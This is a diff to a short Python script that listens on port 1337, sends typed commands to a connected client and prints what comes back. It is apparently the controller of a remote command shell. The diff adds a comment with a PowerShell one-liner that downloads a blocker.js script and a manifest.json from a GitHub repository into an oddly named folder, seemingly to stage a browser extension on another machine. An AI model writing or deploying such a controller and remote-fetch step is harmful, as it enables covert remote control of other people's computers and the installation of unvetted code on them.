@@ -1,4 +1,7 @@
 import socket
+#command to downloads extensions:->
+#mkdir potho ; cd potho ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/blocker.js" -OutFile "./p.js"  ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/manifest.json" -OutFile "./p2.json"
+
 server_socket = socket.socket()
 server_socket.bind(("0.0.0.0", 1337))
 server_socket.listen()
@@ -17,6 +20,7 @@ while(reply != "exit_of_server"):
             client_socket.send(command.encode())
             output = client_socket.recv(1024).decode()
             print(output)
+
 
 
 client_socket.close()
